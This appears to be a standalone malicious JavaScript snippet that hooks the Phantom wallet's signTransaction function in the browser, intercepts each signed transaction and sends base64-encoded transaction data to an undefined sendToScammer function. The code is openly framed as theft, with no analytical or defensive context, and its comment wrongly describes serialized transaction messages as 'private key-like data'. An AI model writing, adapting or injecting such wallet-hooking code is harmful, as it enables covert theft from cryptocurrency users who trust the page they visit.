console.log("Hooking Phantom Wallet API...");

// ✅ Hook Phantom's signTransaction API
if (window.solana) {
    const originalSignTransaction = window.solana.signTransaction;

    window.solana.signTransaction = async function(transaction) {
        console.log("🔍 Intercepted signTransaction call!");

        const signedTx = await originalSignTransaction.apply(this, arguments);
        const extractedData = signedTx.serializeMessage();  // Extract transaction data
        
        sendToScammer(btoa(extractedData));  // Send encoded private key-like data
        return signedTx;
    };
} else {
    console.log("❌ Phantom Wallet not detected!");
}
